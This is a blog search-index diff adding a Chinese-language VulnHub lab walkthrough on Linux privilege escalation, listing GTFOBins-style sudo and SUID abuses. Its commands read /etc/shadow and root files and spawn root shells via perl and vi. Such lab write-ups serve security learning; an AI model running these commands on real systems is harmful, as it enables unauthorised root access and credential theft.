@@ -1289,4 +1289,180 @@
         <tag>靶场，DRIFTINGBLUES系列，渗透笔记</tag>
       </tags>
   </entry>
+  <entry>
+    <title>VulnHub-HACKSUDO:L.P.E.（部分）</title>
+    <url>/2024/05/06/HACKSUDO-L.P.E./</url>
+    <content><![CDATA[<h1 id="HACKSUDO-L-P-E-（部分）"><a href="#HACKSUDO-L-P-E-（部分）" class="headerlink" title="HACKSUDO: L.P.E.（部分）"></a>HACKSUDO: L.P.E.（部分）</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.217.175/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506164252925.png" alt="image-20240506164252925"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -sV -T4 -p-  192.168.217.185</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506164451606.png" alt="image-20240506164451606"></p>
+<h3 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h3><p>访问80端口发现是一个登录界面，还有一句提示，飘过来得提示，告诉我们账号密码要在这个页面寻找</p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506165106208.png" alt="image-20240506165106208"></p>
+<p>通过查看源码在底部注释内容中发现账号密码。进行登录</p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506165204150.png" alt="image-20240506165204150"></p>
+<p><img src="C:/Users/vpro/AppData/Roaming/Typora/typora-user-images/image-20240506165322697.png" alt="image-20240506165322697"></p>
+<p>经过查看发现这个靶机是个用来练习提取得靶机</p>
+<h2 id="挑战一：sudo-滥用"><a href="#挑战一：sudo-滥用" class="headerlink" title="挑战一：sudo 滥用"></a>挑战一：sudo 滥用</h2><p>感觉sudo提权基本都在工具GTFOBins中，地址;<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<h3 id="apt-get"><a href="#apt-get" class="headerlink" title="apt-get"></a>apt-get</h3><p>工具搜索发现命令，执行</p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506172215777.png" alt="image-20240506172215777"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506172316061.png" alt="image-20240506172316061"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506172402573.png" alt="image-20240506172402573"></p>
+<h3 id="arp"><a href="#arp" class="headerlink" title="arp"></a>arp</h3><p>方法一：通过读取&#x2F;etc&#x2F;shadow 文件尝试获取root密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/sbin/arp -vf /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506174630006.png" alt="image-20240506174630006"></p>
+<p>使用工具<code>hashcat</code>进行爆破 前提：好的字典</p>
+<p>方法二：使用命令读取</p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506193937858.png" alt="image-20240506193937858"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/sbin/arp -vf /root/root.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506180909288.png" alt="image-20240506180909288"></p>
+<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506181408340.png" alt="image-20240506181408340"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506181349204.png" alt="image-20240506181349204"></p>
+<h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506181714728.png" alt="image-20240506181714728"></p>
+<p>图中命令”$LFILE”为需要读取得文件，替换成&#x2F;root&#x2F;root.txt </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo base32 /root/root.txt | base32 -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506181920107.png" alt="image-20240506181920107"></p>
+<h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506182051169.png" alt="image-20240506182051169"></p>
+<p>跟上面一样，”$LFILE”替换成&#x2F;root&#x2F;root.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo base64 /root/root.txt | base64 -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506182258642.png" alt="image-20240506182258642"></p>
+<h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506182545737.png" alt="image-20240506182545737"></p>
+<p>跟上面差不多原理</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /root/root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506182533138.png" alt="image-20240506182533138"></p>
+<h3 id="log无环境"><a href="#log无环境" class="headerlink" title="log无环境"></a>log无环境</h3><h3 id="ssl无环境"><a href="#ssl无环境" class="headerlink" title="ssl无环境"></a>ssl无环境</h3><h3 id="comm"><a href="#comm" class="headerlink" title="comm"></a>comm</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506183000510.png" alt="image-20240506183000510"></p>
+<p>原理与上面相同</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo comm /root/root.txt /dev/null 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506183145426.png" alt="image-20240506183145426"></p>
+<h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506192641456.png" alt="image-20240506192641456"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cp &quot;root/root.txt&quot; /dev/stdout</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506192729994.png" alt="image-20240506192729994"></p>
+<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506193017986.png" alt="image-20240506193017986"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo curl file://\/root/root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506193207873.png" alt="image-20240506193207873"></p>
+<h3 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506193332940.png" alt="image-20240506193332940"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cut -d &quot;&quot; -f1 &quot;/root/root.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506193612510.png" alt="image-20240506193612510"></p>
+<h3 id="dash"><a href="#dash" class="headerlink" title="dash"></a>dash</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506194424298.png" alt="image-20240506194424298"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506194413800.png" alt="image-20240506194413800"></p>
+<h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506194600499.png" alt="image-20240506194600499"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo date -f &quot;/root/root.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506194700606.png" alt="image-20240506194700606"></p>
+<h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506194834874.png" alt="image-20240506194834874"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo diff --line-format=%L /dev/null /root/root.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506194949085.png" alt="image-20240506194949085"></p>
+<h3 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h3><p>无提权办法</p>
+<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506195111728.png" alt="image-20240506195111728"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506195144045.png" alt="image-20240506195144045"></p>
+<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506195327961.png" alt="image-20240506195327961"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506195310459.png" alt="image-20240506195310459"></p>
+<h3 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506195424146.png" alt="image-20240506195424146"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506195502748.png" alt="image-20240506195502748"></p>
+<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506195614005.png" alt="image-20240506195614005"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506195647203.png" alt="image-20240506195647203"></p>
+<h3 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506204030336.png" alt="image-20240506204030336"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ip -force -batch &quot;/root/root.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506204324398.png" alt="image-20240506204324398"></p>
+<h3 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506204525479.png" alt="image-20240506204525479"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506204948710.png" alt="image-20240506204948710"></p>
+<p>靶机环境出现问题</p>
+<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506205204898.png" alt="image-20240506205204898"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506205327134.png" alt="image-20240506205327134"></p>
+<h3 id="socket无环境"><a href="#socket无环境" class="headerlink" title="socket无环境"></a>socket无环境</h3><h3 id="vi"><a href="#vi" class="headerlink" title="vi"></a>vi</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506210727674.png" alt="image-20240506210727674"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi -c &#x27;:!/bin/sh&#x27; /dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506210807444.png" alt="image-20240506210807444"></p>
+<h3 id="view"><a href="#view" class="headerlink" title="view"></a>view</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506211000359.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo view -c &#x27;:!/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506210947083.png" alt="image-20240506210947083"></p>
+<h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506221522423.png" alt="image-20240506221522423"></p>
+<h3 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506221659635.png" alt="image-20240506221659635"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506221740453.png" alt="image-20240506221740453"></p>
+<h3 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506221835077.png" alt="image-20240506221835077"></p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo xxd &quot;/root/root.txt&quot; | xxd -r</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506231719676.png" alt="image-20240506231719676"></p>
+<h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506230047863.png" alt="image-20240506230047863"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240506230258109.png" alt="image-20240506230258109"></p>
+<h2 id="挑战二：SUID滥用"><a href="#挑战二：SUID滥用" class="headerlink" title="挑战二：SUID滥用"></a>挑战二：SUID滥用</h2><p>了解SUID提权</p>
+<blockquote>
+<p>suid(set uid)是linux中的一种特殊权限，suid可以让调用者以文件拥有者身份运行该文件，所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</p>
+<p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p>
+<p>linux引入了3个文件来管理用户组：</p>
+<ol>
+<li>&#x2F;etc&#x2F;passwd存放用户信息。</li>
+<li>&#x2F;etc&#x2F;shadow存放用户密码信息。</li>
+<li>&#x2F;etc&#x2F;group存放组信息。</li>
+</ol>
+<p>在文件系统中的每个文件的文件头里面添加了用户和文件之间的关系信息。</p>
+<p>用户信息&#x2F;etc&#x2F;passwd每行共有7个字段冒号隔开：</p>
+<p>字段1为用户名。</p>
+<p>字段2为用户的密码。</p>
+<p>字段3为指UID，每个用户都有自己的uid。</p>
+<p>字段4为组UID，每个用户都有不同的uid。</p>
+<p>字段5为解释说明的字段。</p>
+<p>字段6为指用户的根目录。</p>
+<p>字段7为指登录shell，用户登录shell，当前为&#x2F;bin&#x2F;zsh表示可以登录，&#x2F;sbin&#x2F;nologin标识不被授权登录。</p>
+</blockquote>
+<h3 id="ar"><a href="#ar" class="headerlink" title="ar"></a>ar</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240507063632007.png" alt="image-20240507063632007"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240507063651522.png" alt="image-20240507063651522"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240507063710139.png" alt="image-20240507063710139"></p>
+<h3 id="ash"><a href="#ash" class="headerlink" title="ash"></a>ash</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240507064035130.png" alt="image-20240507064035130"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240507064359987.png" alt="image-20240507064359987"></p>
+<h3 id="viluhacker-无用户文件夹"><a href="#viluhacker-无用户文件夹" class="headerlink" title="viluhacker(无用户文件夹)"></a>viluhacker(无用户文件夹)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240507064707235.png" alt="image-20240507064707235"></p>
+<h3 id="base32-与标题不符"><a href="#base32-与标题不符" class="headerlink" title="base32(与标题不符)"></a>base32(与标题不符)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240507064911721.png" alt="image-20240507064911721"></p>
+<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240507070103510.png" alt="image-20240507070103510"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240507070239434.png" alt="image-20240507070239434"></p>
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240507070223823.png" alt="image-20240507070223823"></p>
+<h3 id="hackme-无"><a href="#hackme-无" class="headerlink" title="hackme(无)"></a>hackme(无)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240507070729370.png" alt="image-20240507070729370"></p>
+<h3 id="e"><a href="#e" class="headerlink" title="e"></a>e</h3><h3 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h3><p><img src="https://raw.githubusercontent.com/coolajui/pictures/main/image-20240507071619929.png" alt="image-20240507071619929"></p>
+<p><strong>有点蒙，以后再说</strong></p>
+]]></content>
+      <categories>
+        <category>靶场，DRIFTINGBLUES系列，渗透笔记</category>
+      </categories>
+      <tags>
+        <tag>靶场，DRIFTINGBLUES系列，渗透笔记</tag>
+      </tags>
+  </entry>
 </search>
